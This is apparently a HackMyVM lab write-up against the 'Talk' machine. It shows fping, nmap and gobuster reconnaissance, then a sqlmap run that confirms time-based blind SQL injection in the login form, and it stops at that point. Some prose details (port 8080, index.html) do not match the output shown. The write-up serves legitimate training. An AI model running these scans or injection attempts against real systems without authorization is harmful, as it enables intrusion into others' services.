# Hunter

## Executive Summary

| Item | Content |
| :--- | :--- |
| **Platform** | [HackMyVM](https://hackmyvm.eu/) |
| **Machine** | [Talk](https://hackmyvm.eu/machines/machine.php?vm=Talk) |
| **Author** | [sml](https://hackmyvm.eu/profile/?user=sml) |
| **Difficulty** | Beginner |

## PenetrationTest

### 1. Enumeration

#### 1-1. Host Scan

The target IP address is 192.168.56.108.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ fping -aqg 192.168.56.102/24
192.168.56.100
192.168.56.102
192.168.56.108
```

#### 1-2. Port Scan

The target open ports is 22 (ssh) and 8080 (http).

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ nmap -A -sS -p- -v -T 4 --script=default,vuln 192.168.56.108 -oN nmap.log
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 18:18 -0400
NSE: Loaded 259 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:18
Completed NSE at 18:18, 10.01s elapsed
Initiating NSE at 18:18
Completed NSE at 18:18, 0.00s elapsed
Initiating NSE at 18:18
Completed NSE at 18:18, 0.00s elapsed
Initiating ARP Ping Scan at 18:18
Scanning 192.168.56.108 [1 port]
Completed ARP Ping Scan at 18:18, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:18
Completed Parallel DNS resolution of 1 host. at 18:18, 0.50s elapsed
Initiating SYN Stealth Scan at 18:18
Scanning 192.168.56.108 [65535 ports]
Discovered open port 80/tcp on 192.168.56.108
Discovered open port 22/tcp on 192.168.56.108
Completed SYN Stealth Scan at 18:19, 28.31s elapsed (65535 total ports)
Initiating Service scan at 18:19
Scanning 2 services on 192.168.56.108
Completed Service scan at 18:19, 6.03s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.56.108
NSE: Script scanning 192.168.56.108.
Initiating NSE at 18:19
Completed NSE at 18:20, 68.11s elapsed
Initiating NSE at 18:20
Completed NSE at 18:20, 0.04s elapsed
Initiating NSE at 18:20
Completed NSE at 18:20, 0.01s elapsed
Nmap scan report for 192.168.56.108
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 e3:fc:1b:74:e5:e3:c9:ef:6d:ac:df:b1:1e:47:83:ad (RSA)
|   256 10:bd:60:33:a0:d1:a4:7d:de:c8:29:0a:c4:7d:b1:aa (ECDSA)
|_  256 4b:fc:30:a8:12:69:e7:b2:ce:ad:99:f1:66:12:cd:8c (ED25519)
| vulners:
|   cpe:/a:openbsd:openssh:7.9p1:
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	9.8	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	A2B36B85-C737-548F-8C04-9339EDCDBFF5	9.8	https://vulners.com/githubexploit/A2B36B85-C737-548F-8C04-9339EDCDBFF5	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	6192C35D-F78B-5C0A-AB8D-9826A79A5320	9.8	https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	CVE-2026-35414	8.1	https://vulners.com/cve/CVE-2026-35414
|     	CVE-2026-35386	8.1	https://vulners.com/cve/CVE-2026-35386
|     	CVE-2026-35385	8.1	https://vulners.com/cve/CVE-2026-35385
|     	BA3887BD-F579-53B1-A4A4-FF49E953E1C0	8.1	https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0	*EXPLOIT*
|     	4FB01B00-F993-5CAF-BD57-D7E290D10C1F	8.1	https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F	*EXPLOIT*
|     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
|     	CVE-2019-16905	7.8	https://vulners.com/cve/CVE-2019-16905
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	7.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	991D2CC4-0E09-5745-97A2-4917461BD6EC	7.8	https://vulners.com/githubexploit/991D2CC4-0E09-5745-97A2-4917461BD6EC	*EXPLOIT*
|     	2E719186-2FED-58A8-A150-762EFBAAA523	7.8	https://vulners.com/gitee/2E719186-2FED-58A8-A150-762EFBAAA523	*EXPLOIT*
|     	23CC97BE-7C95-513B-9E73-298C48D74432	7.8	https://vulners.com/githubexploit/23CC97BE-7C95-513B-9E73-298C48D74432	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	7.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	284B94FC-FD5D-5C47-90EA-47900DAD1D1E	7.0	https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E	*EXPLOIT*
|     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
|     	EDB-ID:46516	6.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	6.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2025-26465	6.8	https://vulners.com/cve/CVE-2025-26465
|     	CVE-2019-6110	6.8	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	6.8	https://vulners.com/cve/CVE-2019-6109
|     	9D8432B9-49EC-5F45-BB96-329B1F2B2254	6.8	https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254	*EXPLOIT*
|     	85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	6.8	https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	*EXPLOIT*
|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918	*EXPLOIT*
|     	1337DAY-ID-32328	6.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	6.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	6.5	https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	*EXPLOIT*
|     	CVE-2026-35387	6.5	https://vulners.com/cve/CVE-2026-35387
|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
|     	C07ADB46-24B8-57B7-B375-9C761F4750A2	6.5	https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2	*EXPLOIT*
|     	A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	6.5	https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	*EXPLOIT*
|     	65B15AA1-2A8D-53C1-9499-69EBA3619F1C	6.5	https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C	*EXPLOIT*
|     	5325A9D6-132B-590C-BDEF-0CB105252732	6.5	https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732	*EXPLOIT*
|     	530326CF-6AB3-5643-AA16-73DC8CB44742	6.5	https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742	*EXPLOIT*
|     	FD2E0EBA-ED84-5304-8862-84BCDEB2F288	5.9	https://vulners.com/githubexploit/FD2E0EBA-ED84-5304-8862-84BCDEB2F288	*EXPLOIT*
|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6111	5.9	https://vulners.com/cve/CVE-2019-6111
|     	CNVD-2021-25272	5.9	https://vulners.com/cnvd/CNVD-2021-25272
|     	721F040C-37BC-59E1-9433-01A2EAC2E755	5.9	https://vulners.com/githubexploit/721F040C-37BC-59E1-9433-01A2EAC2E755	*EXPLOIT*
|     	6D74A425-60A7-557A-B469-1DD96A2D8FF8	5.9	https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	CVE-2018-20685	5.3	https://vulners.com/cve/CVE-2018-20685
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	CNVD-2019-01296	5.3	https://vulners.com/cnvd/CNVD-2019-01296
|     	CVE-2025-32728	4.3	https://vulners.com/cve/CVE-2025-32728
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|     	CVE-2025-61985	3.6	https://vulners.com/cve/CVE-2025-61985
|     	CVE-2025-61984	3.6	https://vulners.com/cve/CVE-2025-61984
|     	B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	3.6	https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	*EXPLOIT*
|     	4C6E2182-0E99-5626-83F6-1646DD648C57	3.6	https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57	*EXPLOIT*
|     	CVE-2026-35388	2.5	https://vulners.com/cve/CVE-2026-35388
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|_    	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
80/tcp open  http    nginx 1.14.2
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners:
|   nginx 1.14.2:
|     	F24D1B4E-B7ED-546A-9886-CDE6898D6FA6	9.3	https://vulners.com/gitee/F24D1B4E-B7ED-546A-9886-CDE6898D6FA6	*EXPLOIT*
|     	NGINX:CVE-2026-9256	9.2	https://vulners.com/nginx/NGINX:CVE-2026-9256
|     	NGINX:CVE-2026-42945	9.2	https://vulners.com/nginx/NGINX:CVE-2026-42945
|     	F8BA6D01-09BC-5DB0-A42B-4E563D68898E	9.2	https://vulners.com/githubexploit/F8BA6D01-09BC-5DB0-A42B-4E563D68898E	*EXPLOIT*
|     	E4F9C549-8192-5FB6-AB68-2A0182498EC1	9.2	https://vulners.com/githubexploit/E4F9C549-8192-5FB6-AB68-2A0182498EC1	*EXPLOIT*
|     	E4E784B6-A59D-5F31-AA0B-4BD1AE4C2A25	9.2	https://vulners.com/githubexploit/E4E784B6-A59D-5F31-AA0B-4BD1AE4C2A25	*EXPLOIT*
|     	DCB2198C-FBEF-526A-91B1-077D0C9A371C	9.2	https://vulners.com/githubexploit/DCB2198C-FBEF-526A-91B1-077D0C9A371C	*EXPLOIT*
|     	DB986575-5515-5217-904C-B2F303FC6604	9.2	https://vulners.com/githubexploit/DB986575-5515-5217-904C-B2F303FC6604	*EXPLOIT*
|     	D5303D8B-E27F-584A-8672-68F16628DB95	9.2	https://vulners.com/githubexploit/D5303D8B-E27F-584A-8672-68F16628DB95	*EXPLOIT*
|     	D3DCF4B0-89DE-5EFB-B681-0725BD21449A	9.2	https://vulners.com/githubexploit/D3DCF4B0-89DE-5EFB-B681-0725BD21449A	*EXPLOIT*
|     	CED8F6B1-8F4A-5CA0-9406-3E0DD1C64695	9.2	https://vulners.com/githubexploit/CED8F6B1-8F4A-5CA0-9406-3E0DD1C64695	*EXPLOIT*
|     	C954251A-D5DC-581F-99D7-C85DE9846EF2	9.2	https://vulners.com/githubexploit/C954251A-D5DC-581F-99D7-C85DE9846EF2	*EXPLOIT*
|     	C1FE5C56-3FCE-56DA-AA3A-8F800CE8CBB1	9.2	https://vulners.com/githubexploit/C1FE5C56-3FCE-56DA-AA3A-8F800CE8CBB1	*EXPLOIT*
|     	B7AC5919-D76A-529B-8E1B-78178908C977	9.2	https://vulners.com/githubexploit/B7AC5919-D76A-529B-8E1B-78178908C977	*EXPLOIT*
|     	AF24E2C9-C4BC-5179-9E2E-AF21ECCFA255	9.2	https://vulners.com/githubexploit/AF24E2C9-C4BC-5179-9E2E-AF21ECCFA255	*EXPLOIT*
|     	98A530E3-D6DF-5A1C-A625-F5D67AF2C8F7	9.2	https://vulners.com/githubexploit/98A530E3-D6DF-5A1C-A625-F5D67AF2C8F7	*EXPLOIT*
|     	85F2445E-7854-51E3-BE0F-509BF472696E	9.2	https://vulners.com/githubexploit/85F2445E-7854-51E3-BE0F-509BF472696E	*EXPLOIT*
|     	84F37866-4BB9-51F0-AFC8-B4F941E79576	9.2	https://vulners.com/githubexploit/84F37866-4BB9-51F0-AFC8-B4F941E79576	*EXPLOIT*
|     	7CDA4B34-508C-5DD4-8578-3C5C3A44A4F3	9.2	https://vulners.com/githubexploit/7CDA4B34-508C-5DD4-8578-3C5C3A44A4F3	*EXPLOIT*
|     	77A888D9-B099-5175-B433-C9C18FEA6B1B	9.2	https://vulners.com/githubexploit/77A888D9-B099-5175-B433-C9C18FEA6B1B	*EXPLOIT*
|     	76C3397C-09F4-5F1E-B0A5-5AC97266BE1B	9.2	https://vulners.com/githubexploit/76C3397C-09F4-5F1E-B0A5-5AC97266BE1B	*EXPLOIT*
|     	6E238313-C2F5-5929-BD80-D026E4B44DE4	9.2	https://vulners.com/githubexploit/6E238313-C2F5-5929-BD80-D026E4B44DE4	*EXPLOIT*
|     	6CB8FD9B-C748-57A2-9FDB-26224BC4F868	9.2	https://vulners.com/githubexploit/6CB8FD9B-C748-57A2-9FDB-26224BC4F868	*EXPLOIT*
|     	5D544171-289B-5AF6-90DF-2C2B919DE93C	9.2	https://vulners.com/githubexploit/5D544171-289B-5AF6-90DF-2C2B919DE93C	*EXPLOIT*
|     	5ACFBA03-104F-5AF5-AAF1-FB5B7870BF2F	9.2	https://vulners.com/githubexploit/5ACFBA03-104F-5AF5-AAF1-FB5B7870BF2F	*EXPLOIT*
|     	484E31EB-CAAE-5718-9941-EC1ADD9B203C	9.2	https://vulners.com/githubexploit/484E31EB-CAAE-5718-9941-EC1ADD9B203C	*EXPLOIT*
|     	48470061-EC55-50C0-8274-090AE01AF1AD	9.2	https://vulners.com/githubexploit/48470061-EC55-50C0-8274-090AE01AF1AD	*EXPLOIT*
|     	3BAFBF73-2648-5540-811A-F95C893D4778	9.2	https://vulners.com/githubexploit/3BAFBF73-2648-5540-811A-F95C893D4778	*EXPLOIT*
|     	27CA994D-1B4B-5CBB-BA5F-4B69CFD6BBAF	9.2	https://vulners.com/githubexploit/27CA994D-1B4B-5CBB-BA5F-4B69CFD6BBAF	*EXPLOIT*
|     	249FFDA3-A061-5AA5-90A9-00C4EA088C4C	9.2	https://vulners.com/githubexploit/249FFDA3-A061-5AA5-90A9-00C4EA088C4C	*EXPLOIT*
|     	204AAC54-CABD-571F-9D3B-BE59F333764B	9.2	https://vulners.com/githubexploit/204AAC54-CABD-571F-9D3B-BE59F333764B	*EXPLOIT*
|     	060C8156-3FA0-592B-949E-4E38AD48E266	9.2	https://vulners.com/githubexploit/060C8156-3FA0-592B-949E-4E38AD48E266	*EXPLOIT*
|     	03328B0E-8919-5D0E-879C-542DCDCC0771	9.2	https://vulners.com/githubexploit/03328B0E-8919-5D0E-879C-542DCDCC0771	*EXPLOIT*
|     	NGINX:CVE-2026-27654	8.8	https://vulners.com/nginx/NGINX:CVE-2026-27654
|     	3F71F065-66D4-541F-A813-9F1A2F2B1D91	8.8	https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91	*EXPLOIT*
|     	NGINX:CVE-2026-27651	8.7	https://vulners.com/nginx/NGINX:CVE-2026-27651
|     	NGINX:CVE-2026-32647	8.5	https://vulners.com/nginx/NGINX:CVE-2026-32647
|     	NGINX:CVE-2026-27784	8.5	https://vulners.com/nginx/NGINX:CVE-2026-27784
|     	NGINX:CVE-2026-42946	8.3	https://vulners.com/nginx/NGINX:CVE-2026-42946
|     	NGINX:CVE-2026-1642	8.2	https://vulners.com/nginx/NGINX:CVE-2026-1642
|     	NGINX:CVE-2018-16845	8.2	https://vulners.com/nginx/NGINX:CVE-2018-16845
|     	NGINX:CVE-2022-41741	7.8	https://vulners.com/nginx/NGINX:CVE-2022-41741
|     	NGINX:CVE-2019-9513	7.8	https://vulners.com/nginx/NGINX:CVE-2019-9513
|     	NGINX:CVE-2019-9511	7.8	https://vulners.com/nginx/NGINX:CVE-2019-9511
|     	NGINX:CVE-2018-16844	7.8	https://vulners.com/nginx/NGINX:CVE-2018-16844
|     	NGINX:CVE-2018-16843	7.8	https://vulners.com/nginx/NGINX:CVE-2018-16843
|     	DF041B2B-2DA7-5262-AABE-9EBD2D535041	7.8	https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041	*EXPLOIT*
|     	PACKETSTORM:167720	7.7	https://vulners.com/packetstorm/PACKETSTORM:167720	*EXPLOIT*
|     	NGINX:CVE-2021-23017	7.7	https://vulners.com/nginx/NGINX:CVE-2021-23017
|     	EDB-ID:50973	7.7	https://vulners.com/exploitdb/EDB-ID:50973	*EXPLOIT*
|     	B175E582-6BBF-5D54-AF15-ED3715F757E3	7.7	https://vulners.com/githubexploit/B175E582-6BBF-5D54-AF15-ED3715F757E3	*EXPLOIT*
|     	3D5EF267-25AF-5E36-885B-89F728833A86	7.7	https://vulners.com/githubexploit/3D5EF267-25AF-5E36-885B-89F728833A86	*EXPLOIT*
|     	25F34A51-EB79-5BBC-8262-6F1876067F04	7.7	https://vulners.com/githubexploit/25F34A51-EB79-5BBC-8262-6F1876067F04	*EXPLOIT*
|     	245ACDDD-B1E2-5344-B37D-5B9A0B0A1F0D	7.7	https://vulners.com/githubexploit/245ACDDD-B1E2-5344-B37D-5B9A0B0A1F0D	*EXPLOIT*
|     	1337DAY-ID-37837	7.7	https://vulners.com/zdt/1337DAY-ID-37837	*EXPLOIT*
|     	1337DAY-ID-36300	7.7	https://vulners.com/zdt/1337DAY-ID-36300	*EXPLOIT*
|     	00455CDF-B814-5424-952E-9088FBB2D42D	7.7	https://vulners.com/githubexploit/00455CDF-B814-5424-952E-9088FBB2D42D	*EXPLOIT*
|     	NGINX:CVE-2019-9516	7.5	https://vulners.com/nginx/NGINX:CVE-2019-9516
|     	NGINX:CVE-2022-41742	7.1	https://vulners.com/nginx/NGINX:CVE-2022-41742
|     	NGINX:CVE-2026-42934	6.3	https://vulners.com/nginx/NGINX:CVE-2026-42934
|     	NGINX:CVE-2026-28753	6.3	https://vulners.com/nginx/NGINX:CVE-2026-28753
|     	NGINX:CVE-2025-53859	6.3	https://vulners.com/nginx/NGINX:CVE-2025-53859
|     	NGINX:CVE-2024-7347	5.7	https://vulners.com/nginx/NGINX:CVE-2024-7347
|     	NGINX:CVE-2025-23419	5.3	https://vulners.com/nginx/NGINX:CVE-2025-23419
|_    	PACKETSTORM:162830	0.0	https://vulners.com/packetstorm/PACKETSTORM:162830	*EXPLOIT*
|_http-server-header: nginx/1.14.2
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|_  /login.php: Possible admin folder
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: chatME
| http-cookie-flags:
|   /:
|     PHPSESSID:
|       httponly flag not set
|   /login.php:
|     PHPSESSID:
|_      httponly flag not set
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.108
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://192.168.56.108:80/
|     Form id:
|     Form action: login.php
|
|     Path: http://192.168.56.108:80/
|     Form id:
|_    Form action: register.php
MAC Address: 08:00:27:AE:61:46 (Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Uptime guess: 27.081 days (since Tue Apr 28 16:23:15 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.28 ms 192.168.56.108

NSE: Script Post-scanning.
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Initiating NSE at 18:20
Completed NSE at 18:20, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.74 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

#### 1-3. WebContentDiscovery

Found index.html.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ gobuster dir --url http://192.168.56.108 -w /usr/share/wordlists/dirb/common.txt -o gobuster.log
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.108
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
css                  (Status: 301) [Size: 185] [--> http://192.168.56.108/css/]
db                   (Status: 301) [Size: 185] [--> http://192.168.56.108/db/]
img                  (Status: 301) [Size: 185] [--> http://192.168.56.108/img/]
index.php            (Status: 200) [Size: 2141]
js                   (Status: 301) [Size: 185] [--> http://192.168.56.108/js/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

#### 1-4. top

The content is simple.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ curl http://192.168.56.108 -v
*   Trying 192.168.56.108:80...
* Established connection to 192.168.56.108 (192.168.56.108 port 80) from 192.168.56.102 port 47068
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.56.108
> User-Agent: curl/8.19.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.14.2
< Date: Mon, 25 May 2026 22:23:16 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=crj4t9f4250oas5sbccai72thl; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>chatME</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">

  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Roboto:400,100,300,500,700,900|RobotoDraft:400,100,300,500,700,900'>
<link rel='stylesheet prefetch' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css'>

      <link rel="stylesheet" href="css/style.css">


</head>

<body>


<!-- Form Mixin-->
<!-- Input Mixin-->
<!-- Button Mixin-->
<!-- Pen Title-->
<div class="pen-title">
  <h1><!-- ChatME--></h1>
</div>
<!-- Form Module-->
<div class="module form-module">
  <div class="toggle"><i class="fa fa-times fa-pencil"></i>
    <div class="tooltip">Click Me</div>
  </div>
  <div class="form">
    <h2>Login to your account</h2>
    <form name="form_login" method="post" action="login.php">
      <input type="text" placeholder="Username" name="username" />
      <input type="password" placeholder="Password" name="password" />
      <button>Login</button>
    </form>
  </div>
  <div class="form">
    <h2>Create an account</h2>
    <form name="form_register" method="post" action="register.php">
      <input type="text" placeholder="Your Name" name="your_name" required="required" />
      <input type="text" placeholder="Username" name="username" required="required" />
      <input type="password" placeholder="Password" name="password" required="required" />
      <input type="email" placeholder="Email Address" name="email" />
      <input type="phone" placeholder="Phone Number" name="phone" />
      <button>Register</button>
    </form>
  </div>
  <div class="cta"><!-- <a href="#">Forgot your password?</a> --><center>Developed by: PJCaraig &copy 2018</center></div>
</div>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://codepen.io/andytran/pen/vLmRVp.js'></script>



    <script  src="js/index.js"></script>




</body>

</html>
* Connection #0 to host 192.168.56.108:80 left intact
```

### 2. Exploitation

#### 2-1. SQLInjection

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ sqlmap -u "http://192.168.56.108/login.php" --data "username=test&password=test" --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.4#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:32:13 /2026-05-25/

[18:32:13] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'index.php?attempt=failed'. Do you want to apply it from now on? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=io90qoitr00...4vc3qo9em4'). Do you want to use those [Y/n] Y
[18:32:13] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:32:13] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] Y
[18:32:13] [WARNING] please consider usage of tamper scripts (option '--tamper')
[18:32:13] [INFO] testing if the target URL content is stable
[18:32:14] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[18:32:14] [INFO] searching for dynamic content
[18:32:14] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)
[18:32:14] [WARNING] target URL content appears to be too dynamic. Switching to '--text-only'
[18:32:14] [INFO] testing if POST parameter 'username' is dynamic
[18:32:14] [INFO] POST parameter 'username' appears to be dynamic
[18:32:14] [INFO] testing for SQL injection on POST parameter 'username'
[18:32:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:32:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:32:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:32:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:32:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:32:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:32:15] [INFO] testing 'Generic inline queries'
[18:32:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:32:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:32:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:32:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:32:25] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:32:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:32:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://192.168.56.108/home.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[18:32:25] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
